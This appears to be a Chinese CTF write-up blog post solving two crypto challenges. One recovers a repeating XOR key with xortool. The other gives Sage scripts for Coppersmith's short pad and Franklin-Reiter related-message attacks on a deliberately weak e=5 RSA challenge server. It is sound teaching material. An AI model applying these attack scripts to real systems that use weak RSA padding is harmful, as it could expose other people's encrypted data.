<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xor-game"><a href="#xor-game" class="headerlink" title="xor_game"></a>xor_game</h3><p>flag作为xor的key重复使用加密明文</p>
<p>利用xortool猜测key的长度和key值</p>
<p>先处理数据，base64解码后转为16进制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat cipher.txt |base64 -d | hex &gt; out.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xortool -x -l 21 -c &apos; &apos; ../out.txt</span><br><span class="line">8 possible key(s) of length 21:</span><br><span class="line">6o7\x1ai6_i+te7es1ing!@#</span><br><span class="line">6o7\x1ai6_i+te7es1ing!\x05#</span><br><span class="line">6o7\x1ai?_i+te7es1ing!@#</span><br><span class="line">6o7\x1ai?_i+te7es1ing!\x05#</span><br><span class="line">xo7\x1ai6_i+te7es1ing!@#</span><br><span class="line">Found 8 plaintexts with 95.0%+ printable characters</span><br><span class="line">See files filename-key.csv, filename-char_used-perc_printable.csv</span><br></pre></td></tr></table></figure>

<p>得出的key大概是是<code>xo7\x1ai6_i+te7es1ing!@#</code>，看着修一修得到<code>xor_is_interesting!@#</code>，与密文异或得到可读的诗说明正确</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line">cipher=base64.b64decode(open(<span class="string">'cipher.txt'</span>,<span class="string">'r'</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    key = (key * (len(data) / len(key) + <span class="number">1</span>))[:len(data)]</span><br><span class="line">    <span class="keyword">return</span> strxor(data, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> enc(cipher,<span class="string">'xor_is_interesting!@#'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">out:</span></span><br><span class="line"><span class="string">Life, thin and light-off time and time again</span></span><br><span class="line"><span class="string">Frivolous tireless</span></span><br><span class="line"><span class="string">one</span></span><br><span class="line"><span class="string">I heard the echo, from the valleys and the heart</span></span><br><span class="line"><span class="string">Open to the lonely soul of sickle harvesting</span></span><br><span class="line"><span class="string">Repeat outrightly, but also repeat the well-being of</span></span><br><span class="line"><span class="string">Eventually swaying in the desert oasis</span></span><br><span class="line"><span class="string">I believe I am</span></span><br><span class="line"><span class="string">Born as the bright summer flowers</span></span><br><span class="line"><span class="string">Do not withered undefeated fiery demon rule</span></span><br><span class="line"><span class="string">Heart rate and breathing to bear the load of the cumbersome</span></span><br><span class="line"><span class="string">Bored</span></span><br><span class="line"><span class="string">Two</span></span><br><span class="line"><span class="string">I heard the music, from the moon and carcass</span></span><br><span class="line"><span class="string">Auxiliary extreme aestheticism bait to capture misty</span></span><br><span class="line"><span class="string">Filling the intense life, but also filling the pure</span></span><br><span class="line"><span class="string">There are always memories throughout the earth</span></span><br><span class="line"><span class="string">I believe I am</span></span><br><span class="line"><span class="string">Died as the quiet beauty of autumn leaves</span></span><br><span class="line"><span class="string">Sheng is not chaos, smoke gesture</span></span><br><span class="line"><span class="string">Even wilt also retained bone proudly Qing Feng muscle</span></span><br><span class="line"><span class="string">Occult</span></span><br><span class="line"><span class="string">Three</span></span><br><span class="line"><span class="string">I hear love, I believe in love</span></span><br><span class="line"><span class="string">Love is a pool of struggling blue-green algae</span></span><br><span class="line"><span class="string">As desolate micro-burst of wind</span></span><br><span class="line"><span class="string">Bleeding through my veins</span></span><br><span class="line"><span class="string">Years stationed in the belief</span></span><br><span class="line"><span class="string">Four</span></span><br><span class="line"><span class="string">I believe that all can hear</span></span><br><span class="line"><span class="string">Even anticipate discrete, I met the other their own</span></span><br><span class="line"><span class="string">Some can not grasp the moment</span></span><br><span class="line"><span class="string">Left to the East to go West, the dead must not return to nowhere</span></span><br><span class="line"><span class="string">See, I wear Zan Flowers on my head, in full bloom along the way all the way</span></span><br><span class="line"><span class="string">Frequently missed some, but also deeply moved by wind, frost, snow or rain</span></span><br><span class="line"><span class="string">Five</span></span><br><span class="line"><span class="string">Prajna Paramita, soon as soon as</span></span><br><span class="line"><span class="string">life be beautiful like summer flowers and death like autumn leaves</span></span><br><span class="line"><span class="string">Also care about what has</span></span><br><span class="line"><span class="string">[Finished in 0.3s]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<h3 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor_rsa"></a>xor_rsa</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import SocketServer</span><br><span class="line">import string</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">from flag import *</span><br><span class="line"></span><br><span class="line">class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RSATCPHandler(SocketServer.BaseRequestHandler):</span><br><span class="line">    def handle(self):</span><br><span class="line">        self.request.sendall(&quot;Welcome to flag getting system\ngive me your token &gt; &quot;)</span><br><span class="line">        token = self.request.recv(1024).strip()</span><br><span class="line">        if not verify(token):</span><br><span class="line">            self.request.sendall(&quot;token error\n&quot;)</span><br><span class="line">        else:</span><br><span class="line">            p = getStrongPrime(1024)</span><br><span class="line">            q = getStrongPrime(1024)</span><br><span class="line">            n = p * q</span><br><span class="line">            e = 5</span><br><span class="line">            nbits = size(n)</span><br><span class="line">            kbits = nbits // (2 * e * e)</span><br><span class="line">            m1 = getRandomNBitInteger(nbits)</span><br><span class="line">            m2 = m1 ^ getRandomNBitInteger(kbits)</span><br><span class="line">            c1 = pow(m1, e, n)</span><br><span class="line">            c2 = pow(m2, e, n)</span><br><span class="line"></span><br><span class="line">            self.request.sendall(&quot;n=&quot; + str(n) + &quot;\n&quot;)</span><br><span class="line">            self.request.sendall(&quot;c1=&quot; + str(c1) + &quot;\n&quot;)</span><br><span class="line">            self.request.sendall(&quot;c2=&quot; + str(c2) + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">            self.request.sendall(&quot;now give me you answer\n&quot;)</span><br><span class="line">            ans1 = self.request.recv(2048).strip()</span><br><span class="line">            ans2 = self.request.recv(2048).strip()</span><br><span class="line"></span><br><span class="line">            if str(ans1) == str(m1) and str(ans2) == str(m2):</span><br><span class="line">                self.request.sendall(FLAG)</span><br><span class="line">            else:</span><br><span class="line">                self.request.sendall(&quot;wrong answer\n&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    HOST, PORT = &quot;0.0.0.0&quot;, 10086</span><br><span class="line">    server = ThreadedTCPServer((HOST, PORT), RSATCPHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>p,q是1024位的质数</p>
<p>n是2048位，e=5</p>
<p><code>nbits=size(n)=2048</code></p>
<p><code>kbits=2048//(2*5*5)=40</code></p>
<p><code>m1 = getRandomNBitInteger(nbits)</code></p>
<p><code>m2 = m1 ^ getRandomNBitInteger(kbits)</code></p>
<p>m1,m2只有前40位不同,长度过短,会造成短填充攻击</p>
<p>m2和m1可以考虑为m1的高2008个bit经过填充获得</p>
<p>可以求得m1-m2的差值diff</p>
<p>知道c1、c2、diff、e、n可以进行相关信息攻击</p>
<p>得到m1，m2发送过去即可得到flag</p>
<p>使用<code>Coppersmith&#39;s Short Pad Attack</code>和<code>Franklin-Reiter Related Message Attack</code>来恢复m1和m2</p>
<h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># coppersmiths_short_pad_attack.sage</span><br><span class="line"></span><br><span class="line">def short_pad_attack(c1, c2, e, n):</span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(2*e*e)</span><br><span class="line">    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.5</span><br><span class="line"></span><br><span class="line">    return diff</span><br><span class="line"></span><br><span class="line">def related_message_attack(c1, c2, diff, e, n):</span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    def gcd(g1, g2):</span><br><span class="line">        while g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        return g1.monic()</span><br><span class="line"></span><br><span class="line">    return -gcd(g1, g2)[0]</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print &quot;aaa&quot;</span><br><span class="line">    n =</span><br><span class="line">    c1 =</span><br><span class="line">    c2 =</span><br><span class="line">    e = 5</span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = nbits//(2*e*e)</span><br><span class="line">    print &quot;upper %d bits (of %d bits) is same&quot; % (nbits-kbits, nbits)</span><br><span class="line"></span><br><span class="line">    # ^^ = bit-wise XOR</span><br><span class="line">    # http://doc.sagemath.org/html/en/faq/faq-usage.html#how-do-i-use-the-bitwise-xor-operator-in-sage</span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    print &quot;difference of two messages is %d&quot; % diff</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print &apos;hhhha&apos;</span><br><span class="line">    print m1</span><br><span class="line">    print m1 + diff</span><br></pre></td></tr></table></figure>

<h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def franklinReiter(n,e,r,c1,c2):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X + r)^e - c2</span><br><span class="line">    return Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[0])</span><br><span class="line"></span><br><span class="line">def compositeModulusGCD(a, b):</span><br><span class="line">    if(b == 0):</span><br><span class="line">        return a.monic()</span><br><span class="line">    else:</span><br><span class="line">        return compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">def CoppersmithShortPadAttack(e,n,C1,C2,eps=1/30):</span><br><span class="line">    import binascii</span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    ZmodN = Zmod(n)</span><br><span class="line">    g1 = x^e - C1</span><br><span class="line">    g2 = (x+y)^e - C2</span><br><span class="line">    res = g1.resultant(g2)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(ZmodN)</span><br><span class="line">    rres = 0</span><br><span class="line">    for i in range(len(res.coefficients())):</span><br><span class="line">        rres += res.coefficients()[i]*(y^(res.exponents()[i][1]))</span><br><span class="line"></span><br><span class="line">    diff = rres.small_roots(epsilon=eps)</span><br><span class="line">    recoveredM1 = franklinReiter(n,e,diff[0],C1,C2)</span><br><span class="line">    print(diff)</span><br><span class="line">    print(recoveredM1)</span><br><span class="line">    print(recoveredM1 + diff[0])</span><br><span class="line"></span><br><span class="line">e = 5</span><br><span class="line">n=0</span><br><span class="line">c1=0</span><br><span class="line">c2=0</span><br><span class="line">CoppersmithShortPadAttack(e, Integer(n), Integer(c1), Integer(c2), 1/50)</span><br></pre></td></tr></table></figure>

<h4 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def composite_gcd(g1,g2):</span><br><span class="line">    return g1.monic() if g2 == 0 else composite_gcd(g2, g1 % g2)</span><br><span class="line"></span><br><span class="line">def franklin_reiter(c1, c2, N, r, e=3):</span><br><span class="line">    P.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">    equations = [x ^ e - c1, (x + r) ^ e - c2]</span><br><span class="line">    g1, g2 = equations</span><br><span class="line">    print(type(g1))</span><br><span class="line">    return -composite_gcd(g1,g2).coefficients()[0]</span><br><span class="line"></span><br><span class="line">def short_pad_attack(c1, c2, e, n, nbits, kbits):</span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    r = h.small_roots(X=2^kbits, beta=0.5)[0]</span><br><span class="line">    m1 = franklin_reiter(c1, c2, n, r, e)</span><br><span class="line">    return m1, m1 + r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = 5</span><br><span class="line">n = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line"></span><br><span class="line">m1, m2 = short_pad_attack(c1, c2, e, n, 2048, 40)</span><br><span class="line">print m1</span><br><span class="line">print m2</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<ul>
<li><p><a href="https://xz.aliyun.com/t/3253" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/3245" target="_blank" rel="noopener">https://xz.aliyun.com/t/3245</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/3255" target="_blank" rel="noopener">https://xz.aliyun.com/t/3255</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/3242" target="_blank" rel="noopener">https://xz.aliyun.com/t/3242</a></p>
</li>
<li><p><a href="http://p0desta.com/2018/11/11/2018HCTF_web题解/" target="_blank" rel="noopener">http://p0desta.com/2018/11/11/2018HCTF_web题解/</a></p>
</li>
</ul>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
